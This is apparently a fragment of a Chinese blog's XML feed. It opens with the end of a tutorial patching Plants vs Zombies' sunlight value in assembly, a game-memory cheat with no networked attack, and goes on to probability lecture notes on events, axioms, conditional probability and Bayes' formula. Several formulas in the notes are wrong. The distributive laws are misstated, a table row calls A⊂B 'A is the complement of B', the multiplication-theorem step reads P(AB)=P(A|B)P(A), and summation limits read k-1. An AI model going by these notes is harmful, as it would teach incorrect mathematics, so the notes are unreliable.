eax,dword ptr ds:[eax+0xD8]       |</span><br><span class="line">0041BA94 | 52               | push edx                              |</span><br><span class="line">0041BA95 | FFD0             | call eax                              |</span><br><span class="line">0041BA97 | C787 78550000 46 | mov dword ptr ds:[edi+0x5578],0x46    | 46:&#x27;F&#x27;</span><br><span class="line">0041BAA1 | 32C0             | xor al,al                             |</span><br><span class="line">0041BAA3 | 5E               | pop esi                               |</span><br><span class="line">0041BAA4 | C3               | ret                                   |</span><br></pre></td></tr></table></figure></li>
<li><p>这样，在阳光减少时的子函数已经破解完成。</p></li>
<li><p>将ecx设置为0x2706,阳光存储上限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00430A11 | B9 06270000      | mov ecx,0x2706                        |</span><br><span class="line">00430A16 | 90               | nop                                   |</span><br></pre></td></tr></table></figure></li>
<li><p>阳光增加子函数破解完成。</p></li>
</ol></li>
</ol>
<h3 id="破解植物种植事件">破解植物种植事件</h3>
<ol type="1">
<li>通过监控植物数量的方式间接查找植物种植事件。因为植物数量会因为植物种植事件而发生变化，所以植物种植事件一定会修改植物种植数量。</li>
</ol>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>概率论与数理统计第一节课-随机事件及其运算</title>
    <url>/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<h1 id="随机事件及其运算">1.1 随机事件及其运算</h1>
<h2 id="概率论发展历程">概率论发展历程</h2>
<h3 id="古典概率时期">古典概率时期</h3>
<p>梅累骑士的<strong>赌徒问题</strong><a href="#fn1"
class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a>。梅累求教育帕斯卡，帕斯卡在1654年建立了概率论的第一个基本概念，<strong>数学期望</strong></p>
<p>惠更斯、帕斯卡、费马创立了早期概率论，这一时期被称作
<strong>组合概率时期</strong>，计算各种古典概率</p>
<h3 id="初等概率时期">初等概率时期</h3>
<p>伯努利提出<strong>概率</strong>是<strong>频率</strong>的<strong>稳定值</strong>
<span id="more"></span> ### 分析概率时期</p>
<p>引入了随机变量。拉普拉斯明确了概率的古典定义，是严密的、系统的奠定概率论基础的第一人。</p>
<p>高斯发现正态分布，发现误差理论，提出最小二乘法，提出概率的古典定义</p>
<p><strong>概率论是数学的一个分支，研究随机现象的数量规律-统计规律性</strong></p>
<hr />
<h2 id="随机现象与随机试验">随机现象与随机试验</h2>
<h3 id="随机现象">随机现象</h3>
<h4 id="确定性现象">确定性现象</h4>
<ul>
<li>在一定条件下必然发生的现象称为确定性现象</li>
</ul>
<h4 id="随机现象-1">随机现象</h4>
<ul>
<li>在一定条件下可能也可能不出现的现象称为随机现象</li>
</ul>
<h4 id="说明">说明</h4>
<p>随机现象解释了条件和结果之间非确定性联系，其数量关系无法用函数加以描述</p>
<p>随机现象在一次观察中出现什么结果具有
<strong>偶然性</strong>，但在大量实验或观察中，这种结果的出现具有一定的统计规律性。概率悖论就是研究随机现象这种本质规律的一门数学学科</p>
<h3 id="随机试验">随机试验</h3>
<h4 id="定义">定义</h4>
<p>在概率论中，把具有以下三个特征的试验称为随机试验</p>
<ol type="1">
<li>可以再想用的条件下重复的进行</li>
<li>每次试验的结果不止一个，并且能事先明确实验的所有可能结果</li>
<li>进行以此试验之前<strong>不能确定</strong>哪一个结果</li>
</ol>
<h4 id="说明-1">说明</h4>
<ol type="1">
<li>随机试验简称为试验，是一个广泛的术语，它包括各种各样的科学实验，也包括对客观事物进行的调查、观察或测量等</li>
<li>随机试验常用<span class="math inline">\(E\)</span>来表示</li>
</ol>
<hr />
<h2 id="样本空间与随机事件">样本空间与随机事件</h2>
<h3 id="样本空间">样本空间</h3>
<h4 id="定义-1">定义</h4>
<p>随机试验<span
class="math inline">\(E\)</span>的所有可能结果组成的集合称为<span
class="math inline">\(E\)</span>的<strong>样本空间</strong>。记为<span
class="math inline">\(S\)</span>。样本空间的元素，样本空间的元素，即试验<span
class="math inline">\(E\)</span>的每一个结果，称为<strong>样本点</strong></p>
<h4 id="说明-2">说明</h4>
<ol type="1">
<li>试验不同，对应的样本空间也不同</li>
<li>同一试验，若试验目的不同，则对应的样本空间也不同</li>
<li>样本点可以是一维的，也可以是多维的</li>
<li>建立样本空间，实际上就是建立随机现象的数学模型。</li>
</ol>
<p>一个样本空间可以概括许多<strong>内容</strong>大不相同的实际问题</p>
<p><strong>描述随机现象的第一步就是建立样本空间</strong></p>
<h3 id="随机事件">随机事件</h3>
<h4 id="基本概念">基本概念</h4>
<p>随机试验<span class="math inline">\(E\)</span>的样本空间<span
class="math inline">\(S\)</span>的子集称为<span
class="math inline">\(E\)</span>的 <strong>随机事件</strong>，简称
<strong>事件</strong></p>
<p>由一个样本点组成的单点集，称为 <strong>基本事件</strong></p>
<p>由若干个基本事件组合成的事件，称为 <strong>复合事件</strong></p>
<p>每次实验中，当且仅当这一子集的一个样本点出现时，称这一
<strong>事件发生</strong></p>
<p>样本空间<span
class="math inline">\(S\)</span>包含所有的样本点，他是<span
class="math inline">\(S\)</span>自身的子集，每次实验中他总是发生的，<strong><span
class="math inline">\(S\)</span>称为必然事件</strong></p>
<p>空集<span
class="math inline">\(\emptyset\)</span>不包含任何点，它也作为样本空间的子集，它在每次实验中都不发生，<strong><span
class="math inline">\(\emptyset\)</span>称为不可能事件</strong></p>
<p>必然事件的对立面是不可能事件，不可能事件的对立面是必然事件，他们互称为
<strong>对立事件</strong></p>
<h4
id="随机事件可简称为事件并以大写字母表示除了已被使用过的字母外se等">随机事件可简称为事件，并以大写字母表示，除了已被使用过的字母外（<span
class="math inline">\(S,E\)</span>等）</h4>
<h4
id="随机试验样本空间与随机事件的关系">随机试验、样本空间与随机事件的关系</h4>
<p>每一个随机试验相应的有一个样本空间</p>
<p>样本空间的<strong>子集</strong>就是<strong>随机事件</strong></p>
<hr />
<h2 id="事件的关系及运算">事件的关系及运算</h2>
<h3 id="设试验e的样本空间为s而aba_kk1cdots是s的子集">设试验<span
class="math inline">\(E\)</span>的样本空间为<span
class="math inline">\(S\)</span>，而<span
class="math inline">\(A,B,A_{k}(k=1,\cdots)\)</span>是<span
class="math inline">\(S\)</span>的子集</h3>
<h4
id="若asubset-b则称事件a包含于事件b或称事件b包含事件a这指的是">若<span
class="math inline">\(A\subset B\)</span>,则称事件<span
class="math inline">\(A\)</span>包含于事件<span
class="math inline">\(B\)</span>，或称事件<span
class="math inline">\(B\)</span>包含事件<span
class="math inline">\(A\)</span>，这指的是</h4>
<p>事件<span class="math inline">\(A\)</span>发生必然导致事件<span
class="math inline">\(B\)</span>发生</p>
<p>若<span class="math inline">\(A\subset B且B\subset A\)</span>
则称事件<span class="math inline">\(A\)</span>与事件<span
class="math inline">\(B\)</span>相等</p>
<h4 id="事件abigcup-bxxin-a或xin-b称为事件a与事件b的和事件">事件<span
class="math inline">\(A\bigcup B=\{x|x\in A或x\in
B\}\)</span>,称为<strong>事件<span
class="math inline">\(A\)</span>与事件<span
class="math inline">\(B\)</span>的和事件</strong></h4>
<h5 id="推广">推广</h5>
<p>称 <span
class="math inline">\(\begin{equation*}\mathop{\bigcup}\limits_{k-1}^nA_k
\end{equation*}\)</span>为<span class="math inline">\(n\)</span>个事件
<span class="math inline">\(A_1,A_2,\cdots A_k\)</span>的和事件</p>
<p>称 <span
class="math inline">\(\begin{equation*}\mathop{\bigcup}\limits_{k-1}^\infty
A_k \end{equation*}\)</span>为可列个事件 <span
class="math inline">\(A_1,A_2,\cdots A_k\)</span>的和事件</p>
<h4
id="事件-abigcap-bxxin-a-且x-in-b称为事件a与事件b的积事件或交事件abigcap-b也记作-ab当且仅当-ab同时发生时事件-abigcap-b发生">事件
<span class="math inline">\(A\bigcap B=\{x|x\in A 且x \in
B\}\)</span>,称为事件A与事件B的积事件(或交事件)。<span
class="math inline">\(A\bigcap B\)</span>也记作 <span
class="math inline">\(AB\)</span>。当且仅当 <span
class="math inline">\(A\)</span>,<span
class="math inline">\(B\)</span>同时发生时事件 <span
class="math inline">\(A\bigcap B\)</span>发生</h4>
<h5 id="推广-1">推广</h5>
<p>称 <span
class="math inline">\(\begin{equation*}\mathop{\bigcap}\limits_{k-1}^nA_k
\end{equation*}\)</span>为<span class="math inline">\(n\)</span>个事件
<span class="math inline">\(A_1,A_2,\cdots A_k\)</span>的积事件</p>
<p>称称 <span
class="math inline">\(\begin{equation*}\mathop{\bigcap}\limits_{k-1}^{\infty}A_k
\end{equation*}\)</span>为<span class="math inline">\(n\)</span>个事件
<span class="math inline">\(A_1,A_2,\cdots A_k\)</span>的积事件</p>
<h3 id="和事件与积事件的运算性质">和事件与积事件的运算性质</h3>
<p><span class="math display">\[
A\bigcup A=A,A\bigcup S=S,A\bigcup \emptyset=A\\
A\bigcap A=A,A\bigcap S=A,A\bigcap \emptyset=\emptyset
\]</span></p>
<h4
id="事件-a-bxxin-a且xnotin-b称为事件-a与事件-b的差事件当且仅当-a发生b不发生时事件-a-b发生">事件
<span class="math inline">\(A-B=\{x|x\in A且x\notin B\}\)</span>称为事件
<span class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>的差事件,当且仅当 <span
class="math inline">\(A\)</span>发生,<span
class="math inline">\(B\)</span>不发生时,事件 <span
class="math inline">\(A-B\)</span>发生</h4>
<h4
id="若-abigcap-bemptyset则称事件-a与-b不能同时发生基本事件是两两互不相容的">若
<span class="math inline">\(A\bigcap B=\emptyset\)</span>,则称事件 <span
class="math inline">\(A\)</span>与 <span
class="math inline">\(B\)</span>不能同时发生,基本事件是两两互不相容的</h4>
<h4
id="若-abigcup-bs且-abigcap-bemptyset则称事件a与事件-b互为逆事件.又称事件-a与事件-b互为逆事件.又称事件-a与事件-b互为队里事件.-a的对立事件记为-barabaras-a">若
<span class="math inline">\(A\bigcup B=S\)</span>且 <span
class="math inline">\(A\bigcap B=\emptyset\)</span>,则称事件<span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>互为逆事件.又称事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>互为逆事件.又称事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>互为队里事件. <span
class="math inline">\(A\)</span>的对立事件记为 <span
class="math inline">\(\bar{A}\)</span>,<span
class="math inline">\(\bar{A}=S-A\)</span></h4>
<h3 id="事件间的运算规律">事件间的运算规律</h3>
<ol type="1">
<li><strong>交换律</strong> <span class="math inline">\(A\bigcup
B=B\bigcup A;A\bigcap B=B\bigcap A\)</span></li>
<li><strong>结合律</strong> <span
class="math inline">\(A\bigcup(B\bigcup C)=(A \bigcup B)\bigcup
C;A\bigcap(B\bigcap C)=(A \bigcap B)\bigcap C\)</span></li>
<li><strong>分配律</strong> <span
class="math inline">\(A\bigcup(B\bigcap C)=(A \bigcap B)\bigcup(A\bigcap
C);A\bigcap(B\bigcup C)=(A \bigcup B)\bigcap(A\bigcup C)\)</span></li>
<li><strong>德<span class="math inline">\(\cdot\)</span>摩根律</strong>
<span class="math inline">\(\overline{A\bigcup B}=\bar{A}\bigcap
\bar{B};\overline{A\bigcap B}=\bar{A}\bigcup\bar{B}\)</span></li>
</ol>
<hr />
<h2 id="概率论与集合论之间的对应关系">概率论与集合论之间的对应关系</h2>
<table>
<colgroup>
<col style="width: 20%" />
<col style="width: 36%" />
<col style="width: 43%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">记号</th>
<th style="text-align: center;">概率论</th>
<th style="text-align: center;">集合论</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(S\)</span></td>
<td style="text-align: center;">样本空间,必然事件</td>
<td style="text-align: center;">全间</td>
</tr>
<tr class="even">
<td style="text-align: center;">$$</td>
<td style="text-align: center;">不可能事件</td>
<td style="text-align: center;">空集</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(e\)</span></td>
<td style="text-align: center;">可能的结果</td>
<td style="text-align: center;">元素</td>
</tr>
<tr class="even">
<td style="text-align: center;"><span
class="math inline">\(A\)</span></td>
<td style="text-align: center;">随机事件</td>
<td style="text-align: center;">子集</td>
</tr>
<tr class="odd">
<td style="text-align: center;">${A} $</td>
<td style="text-align: center;"><span
class="math inline">\(A\)</span>的对立事件</td>
<td style="text-align: center;"><span
class="math inline">\(A\)</span>的补集</td>
</tr>
<tr class="even">
<td style="text-align: center;">$AB $</td>
<td style="text-align: center;"><span
class="math inline">\(A\)</span>出现必然导致 <span
class="math inline">\(B\)</span>出现</td>
<td style="text-align: center;"><span class="math inline">\(A\)</span>是
<span class="math inline">\(B\)</span>的补集</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(A=B\)</span></td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>相等</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与集合 <span
class="math inline">\(B\)</span>相等</td>
</tr>
<tr class="even">
<td style="text-align: center;">$AB $</td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件B的和事件</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与集合 <span
class="math inline">\(B\)</span>的并集</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><span
class="math inline">\(AB\)</span></td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>的积事件</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与结婚 <span
class="math inline">\(B\)</span>的交集</td>
</tr>
<tr class="even">
<td style="text-align: center;">$A-B $</td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与事件 <span
class="math inline">\(B\)</span>的差事件</td>
<td style="text-align: center;">集合 <span
class="math inline">\(A\)</span>与集合 <span
class="math inline">\(B\)</span>的差集</td>
</tr>
<tr class="odd">
<td style="text-align: center;">$AB=$</td>
<td style="text-align: center;">事件 <span
class="math inline">\(A\)</span>与 <span
class="math inline">\(B\)</span>互不相容</td>
<td style="text-align: center;"><span class="math inline">\(A\)</span>与
<span class="math inline">\(B\)</span>两集合中没有相同的元素</td>
</tr>
</tbody>
</table>
<hr />
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li
id="fn1"><p>传说，17世纪中叶，法国贵族公子梅累参加赌博，和赌友掷骰子，各押赌注32个金币．双方约定，梅累如果先掷出三次6点，或者赌友先掷出三次4点，就算赢了对方．赌博进行了一段时间，梅累已经两次掷出6点，赌友已经一次掷出4点．这时候梅累接到通知，要他马上陪国王接见外宾，赌博只好中断了．这就碰到一个问题：两个人应该怎样分这64个金币才算合理呢？赌友说，他要再碰上两次4点，或梅累要再碰上一次6点就算赢，所以梅累分64个金币2/3的，自己分64个金币的1/3．梅累急辩说，不对，即使下一次赌友掷出了4点，他还可以得1/2，即32个金币；再加上下一次还有一半希望得16个金币，所以他应该分64的个金币的3/4，赌友只能分得64个金币的1/4．两人到底谁说得对呢？梅累为这问题苦恼好久，最后他不得不向法国数学家、物理学家帕斯卡请教，请求他帮助作出公正的裁判，这就成为有趣的“分赌注”问题．帕斯卡是17世纪有名的“神童”数学家．可是，梅累提出的“分赌注”的问题，却把他难住了．他苦苦思考了近三年，到1654年才算有了点眉目，于是写信给他的好友费马，两人讨论结果，并取得了一致的意见：梅累的分法是对的，他应得64个金币的，赌友应得64个金币的.用期望解释比较好。<a
href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>概率论第三节课-条件概率和全概率公式</title>
    <url>/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE-%E6%9D%A1%E4%BB%B6%E6%A6%82%E7%8E%87%E5%92%8C%E5%85%A8%E6%A6%82%E7%8E%87%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="条件概率和全概率公式">条件概率和全概率公式</h1>
<h2 id="条件概率">条件概率</h2>
<h3 id="定义">定义</h3>
<p>设 <span class="math inline">\(A\)</span>,<span
class="math inline">\(B\)</span>是两个事件,且 <span
class="math inline">\(P(A)&gt;0\)</span>,称 <span
class="math display">\[
P(B|A)=\frac{P(AB)}{P(A)}
\]</span> 为在事件 <span
class="math inline">\(A\)</span>发生的条件下事件 <span
class="math inline">\(B\)</span>发生的条件概率</p>
<p>同理可得 <span class="math display">\[
P(A|B)=\frac{P(AB)}{P(B)}
\]</span> 为事件 <span class="math inline">\(B\)</span>发生的条件下
<span class="math inline">\(A\)</span>发生的概率 <span id="more"></span> ###
性质</p>
<ol type="1">
<li>非负性：对于每一事件 <span class="math inline">\(B\)</span>,有 <span
class="math inline">\(P(B|A)\geq 0\)</span></li>
<li>规范性：对于必然事件 <span class="math inline">\(S\)</span>,有 <span
class="math inline">\(P(S|A)=1\)</span></li>
<li>可列可加性：设 <span
class="math inline">\(B_1,B_2,\cdots\)</span>是两两不相容事件,则有</li>
</ol>
<p><span class="math display">\[
\begin{equation*}
P(\mathop{\bigcup}\limits_{i-1}^\infty B_i|A)=\sum\limits_{i-1} ^\infty
P(B_i|A)
\end{equation*}
\]</span></p>
<p>即条件概率满足概率的三个性质,所以条件概率也是概率</p>
<hr />
<h2 id="乘法定理">乘法定理</h2>
<p>设 <span class="math inline">\(A\)</span>,<span
class="math inline">\(B\)</span>是两个事件,且 <span
class="math inline">\(P(A)&gt;0\)</span>,则 <span
class="math display">\[
P(B|A)=\frac{P(AB)}{P(A)} \longrightarrow P(AB)=P(A|B)P(A)
\]</span> 由此的到下面乘法定理:</p>
<p>设 <span class="math inline">\(P(A)&gt;0\)</span>,则有<span
class="math inline">\(P(AB)=P(B|A)P(A)\)</span></p>
<h4 id="推广">推广</h4>
<p>设 <span class="math inline">\(A,B,C\)</span>为事件,且 <span
class="math inline">\(P(AB)&gt;0\)</span>,则有 <span
class="math display">\[
P(ABC)=P(C|AB)P(B|A)P(A)
\]</span> 一般设 <span class="math inline">\(A_1,A_2,\cdots
,A_n\)</span>为 <span class="math inline">\(n\)</span>个事件, <span
class="math inline">\(n\geq2\)</span>,且 <span
class="math inline">\(P(A_1A_2\cdots A_{n-1})&gt;0\)</span>,则有 <span
class="math display">\[
P(A_1A_2\cdots A_n)=P(A_n|A_1A_2\cdots A_{n-1})P(A_{n-1}|A_1A_2\cdots
A_{n-2})\cdots P(A_2|A_1)P(A_1)
\]</span></p>
<hr />
<h2 id="全概率公式">全概率公式</h2>
<h3 id="样本空间的划分或完备事件组">样本空间的划分(或完备事件组)</h3>
<h4 id="定义-1">定义</h4>
<p>设 <span class="math inline">\(S\)</span>为试验 <span
class="math inline">\(E\)</span>的样本空间,<span
class="math inline">\(B_1,B_2,\cdots B_n\)</span>为 <span
class="math inline">\(E\)</span>的一组事件,若</p>
<ol type="1">
<li><span class="math inline">\(B_iB_j=\emptyset ,i\neq
j,i,j=1,2,\cdots,n\)</span> //任何两个事件没有交集</li>
<li><span class="math inline">\(B_1\bigcup B_2 \bigcup \cdots
B_n=S\)</span> //所有事件的并集构成一个样本空间</li>
</ol>
<p>则称 <span class="math inline">\(B_1,B_2,\cdots
B_n\)</span>为样本空间 <span
class="math inline">\(S\)</span>的一个划分或一个完备事件组</p>
<h3 id="全概率公式-1">全概率公式</h3>
<h4 id="定理">定理</h4>
<p>设试验 <span class="math inline">\(E\)</span>的样本空间为 <span
class="math inline">\(S\)</span>,<span
class="math inline">\(A\)</span>为 <span
class="math inline">\(E\)</span>的时间 <span
class="math inline">\(B_1,B_2,\cdots ,B_n\)</span>为 <span
class="math inline">\(S\)</span>的一个划分,且 <span
class="math inline">\(P(B_i)&gt;0(i=1,2,\cdots n)\)</span>则 <span
class="math display">\[
P(A)=P(A|B_1)P(B_1)+P(A|B_2)P(B_2)+\cdots +P(A|B_n)P(B_n)
\]</span> 上式称为 <strong>全概率公式</strong></p>
<h4 id="说明">说明</h4>
<p>全概率公式的主要用处在于他可以讲一个复杂时间的概率计算问题,分解为若干个简单事件的概率计算问题,最后应用概率的可加性求出最终的结果</p>
<p><strong>化整为零——各个击破——合而为一</strong></p>
<h3 id="贝叶斯公式">贝叶斯公式</h3>
<h4 id="定理-1">定理</h4>
<p>设试验 <span class="math inline">\(E\)</span>的样本空间为 <span
class="math inline">\(S\)</span>. <span
class="math inline">\(A\)</span>为 <span
class="math inline">\(E\)</span>的时间.<span
class="math inline">\(B_1,B_2,\cdots,B_n\)</span>为 <span
class="math inline">\(S\)</span>的一个划分,且 <span
class="math inline">\(P(A)&gt;0,P(B_1)&gt;0\
(i=1,2,\cdots,n)\)</span>,则 <span class="math display">\[
P(B_i|A)=\frac{P(A|B_i)P(B_i)}{\sum\limits_{j-1}^nP(A|B_j)P(B_j)}
\]</span> 上式称为 <strong>贝叶斯公式</strong></p>
<hr />
<h2 id="小结">小结</h2>
<p><span class="math display">\[
条件概率P(B|A)=\frac{P(AB)}{P(A)}\longrightarrow
乘法定理P(AB)=P(B|A)P(A) \\
\downarrow \\
全概率公式 \\
P(A)=P(A|B_1)P(B_1)+P(A|B_2)P(B_2)+\cdots +P(A|B_n)P(B_n) \\
\downarrow\\
贝叶斯公式 \\
P(B_i|A)=\frac{P(A|B_i)P(B_i)}{\sum\limits_{j-1}^nP(A|B_j)P(B_j)},i=1,2,\cdots,n
\]</span></p>
<h3 id="条件概率-pab与积事件概率-pab的区别">条件概率 <span
class="math inline">\(P(A|B)\)</span>与积事件概率 <span
class="math inline">\(P(AB)\)</span>的区别</h3>
<p><span class="math inline">\(P(AB)\)</span>表示在样本空间 <span
class="math inline">\(S\)</span>中, <span
class="math inline">\(AB\)</span>发生的概率,而 <span
class="math inline">\(P(B|A)\)</span>表示缩小的样本空间 <span
class="math inline">\(S_A\)</span>中, <span
class="math inline">\(B\)</span>发生的概率.用古典概率公式,则 <span
class="math display">\[
P(B|A)=\frac{AB中基本事件数}{S_A中基本事件数} \\
P(AB)=\frac{AB中基本事件数}{S中基本事件数}
\]</span> 一般来说, <span class="math inline">\(P(B|A)\)</span>比 <span
class="math inline">\(P(AB)\)</span>大.</p>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>概率论与数理统计第二节课-随机事件的概率</title>
    <url>/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E7%9A%84%E6%A6%82%E7%8E%87/</url>
    <content><![CDATA[<h1 id="随机事件的概率">1.2 随机事件的概率</h1>
<h2 id="频率的定义与性质">频率的定义与性质</h2>
<h3 id="频率的定义">频率的定义</h3>
<p>在相同的条件下,进行了 <span
class="math inline">\(n\)</span>次试验,在这 <span
class="math inline">\(n\)</span>次试验中,事件 <span
class="math inline">\(A\)</span>发生的次数 <span
class="math inline">\(n_A\)</span>称为事件 <span
class="math inline">\(A\)</span>发生的频数.比值 <span
class="math inline">\(\frac{n_A}{n}\)</span>称为事件 <span
class="math inline">\(A\)</span>发生的频率,记作 <span
class="math inline">\(f_n(A)\)</span></p>
<h3 id="频率的性质">频率的性质</h3>
<p>频率具有 <strong>随机波动性</strong>,对于同样的 <span
class="math inline">\(n\)</span>,所得的 <span
class="math inline">\(f\)</span>不一定相同</p>
<p>对于一种只有两种结果的实验来说,实验次数 <span
class="math inline">\(n\)</span> 较少时,频率 <span
class="math inline">\(f_n(H)\)</span>在0与1之间随机波动,其幅度较大,但随着
<span class="math inline">\(n\)</span>增大,频率 <span
class="math inline">\(f_n(H)\)</span>呈现出稳定性,当实验次数逐渐增大时
<span
class="math inline">\(f_n(H)\)</span>总是在0.5附近摆动,而逐渐稳定于0.5</p>
<p>大量实验证明,当重复试验的次数 <span
class="math inline">\(n\)</span>逐渐增大时,频率 <span
class="math inline">\(f_n(A)\)</span>呈现出稳定性,逐渐稳定于某一个常数,这种
<strong>频率稳定性</strong>即通常所说的 <strong>统计规律性</strong>
<span id="more"></span> ### 概率的统计学定义</p>
<p>在大量重复实验中,若事件 <span
class="math inline">\(A\)</span>发生的频率稳定的在某一个常数 <span
class="math inline">\(p\)</span>附近浮动,则称该常数 <span
class="math inline">\(p\)</span>为事件 <span
class="math inline">\(A\)</span>发生的概率,记为 <span
class="math inline">\(P(A)\)</span>,即 <span
class="math inline">\(P(A)=p\)</span></p>
<ol type="1">
<li><strong>频率是变动的,概率是一个常数</strong></li>
<li><strong>概率可以理解为实验次数无限增大时,频率的极限,所以,当实验次数无限增大时,有
<span class="math inline">\(f_n(A)\approx p\)</span> </strong></li>
</ol>
<hr />
<h2 id="概率的定义与性质">概率的定义与性质</h2>
<h3 id="概率的公理化定义">概率的公理化定义</h3>
<p>设 <span class="math inline">\(E\)</span>是随机试验,<span
class="math inline">\(S\)</span>是他的样本空间.对于 <span
class="math inline">\(E\)</span>的每一事件 <span
class="math inline">\(A\)</span>赋予一个实数,记为 <span
class="math inline">\(P(A)\)</span>,称为事件 <span
class="math inline">\(A\)</span>的概率.如果集合函数 <span
class="math inline">\(P(\cdot)\)</span>满足条件:</p>
<ol type="1">
<li>非负性:对于每一个事件,有 <span class="math inline">\(P(A)\ge
0\)</span></li>
<li>规范性:对于必然事件 <span class="math inline">\(S\)</span>,有 <span
class="math inline">\(P(S)=1\)</span></li>
<li>可列可加性:设 <span
class="math inline">\(A_1,A_2,\cdots\)</span>是两两不相容的事件,即对于
<span class="math inline">\(A_iA_j=\emptyset,i\neq
j,i,j=1,2,\cdots\)</span>,有 <span class="math inline">\(P(A_1\bigcup
A_2\bigcup \cdots) =P(A_1)+P(A_2)+\cdots\)</span></li>
</ol>
<h3 id="概率的性质">概率的性质</h3>
<ul>
<li>性质1
<ul>
<li><span class="math inline">\(P(\emptyset)=0\)</span></li>
</ul></li>
<li>性质2
<ul>
<li>有限可加性</li>
</ul></li>
<li>性质3
<ul>
<li>设 <span class="math inline">\(A,B\)</span>是两个事件,若 <span
class="math inline">\(A\subset B\)</span>,则有
<ul>
<li><span class="math inline">\(P(B-A)=P(B)-P(A)\)</span></li>
<li><span class="math inline">\(P(B)\ge P(A)\)</span></li>
<li><span class="math inline">\(B-A=B-AB=B\bar{A}\)</span></li>
</ul></li>
</ul></li>
<li>性质4
<ul>
<li>对于任一事件 <span class="math inline">\(A\)</span>,<span
class="math inline">\(P(A)\le1\)</span></li>
</ul></li>
<li>性质5
<ul>
<li>逆事件的概率
<ul>
<li>对于任一事件 <span class="math inline">\(A\)</span>,有 <span
class="math inline">\(P(\bar{A})=1-P(A)\)</span></li>
</ul></li>
</ul></li>
<li>性质6
<ul>
<li>加法公式
<ul>
<li>对于任意两事件 <span class="math inline">\(A\)</span>,<span
class="math inline">\(B\)</span>.有 <span
class="math inline">\(P(A\bigcup B)=P(A)+P(B)-P(AB)\)</span></li>
</ul></li>
</ul></li>
</ul>
<hr />
<h2 id="古典概型">古典概型</h2>
<h3 id="定义">定义</h3>
<p>设 <span class="math inline">\(E\)</span>是随机试验,若 <span
class="math inline">\(E\)</span>满足下列条件</p>
<ol type="1">
<li>实验的样本空间只包含有限个元素</li>
<li>实验中每个基本事件的可能型相同,</li>
</ol>
<p>则称 <span
class="math inline">\(E\)</span>为<strong>等可能概型</strong></p>
<p>等可能改性的试验大量存在,它在概率论发展初期是主要研究对象.等可能概型的一些概念具有直观、容易理解的特点,应用非常广泛</p>
<h3 id="古典概型的计算公式">古典概型的计算公式</h3>
<h4 id="定理">定理</h4>
<p>设试验的样本空间 <span class="math inline">\(S\)</span>包含 <span
class="math inline">\(n\)</span>个样本点,事件 <span
class="math inline">\(A\)</span>有 <span
class="math inline">\(k\)</span>个基本事件,则有: <span
class="math display">\[
P(A)=\frac{k}{n}=\frac{A的基本事件数}{S的基本事件的总数}=\frac{N(A)}{N(S)}
\]</span> 该式称为等可能概型中事件概率的计算公式</p>
<p><strong>当样本空间的元素较多时,一般不再将元素一一列出,秩序分别求出
<span class="math inline">\(S\)</span>和 <span
class="math inline">\(A\)</span>中元素的个数,在用计算公式即可求得相应的概率</strong></p>
<p>人们在长期事件中得到
<strong>概率很小的事在一次试验中实际上几乎是不可能发生的</strong>,<a
href="#fn1" class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a>现在概率很小的事件在一次试验中竟然发生了,有理由怀疑假设的正确性,从而</p>
<hr />
<h2 id="几何概型">几何概型</h2>
<h3 id="定义-1">定义</h3>
<p>当随机实验的样本空间是某个区域 <span
class="math inline">\(S\)</span>,并且任意一点落在测度(长度、面积、体积)相同的子区域
<span class="math inline">\(A\)</span>是等可能的,而与 <span
class="math inline">\(A\)</span>的位置和形状无关.</p>
<p>则事件 <span class="math inline">\(A\)</span>的概率可定义为: <span
class="math display">\[
P(A)=\frac{mA}{mS}
\]</span> <em>其中 <span
class="math inline">\(mS\)</span>是样本空间的测度,<span
class="math inline">\(mA\)</span>是构成事件 <span
class="math inline">\(A\)</span>的子区域的测度.</em>这养借助于集合上的测度来合理规定概率称为<strong>几何概型</strong></p>
<h3 id="说明">说明</h3>
<p>当浮点概型的试验结果为<strong>连续无穷多个</strong>时,就归结为几何概型</p>
<hr />
<h2 id="小结">小结</h2>
<ol type="1">
<li>频率
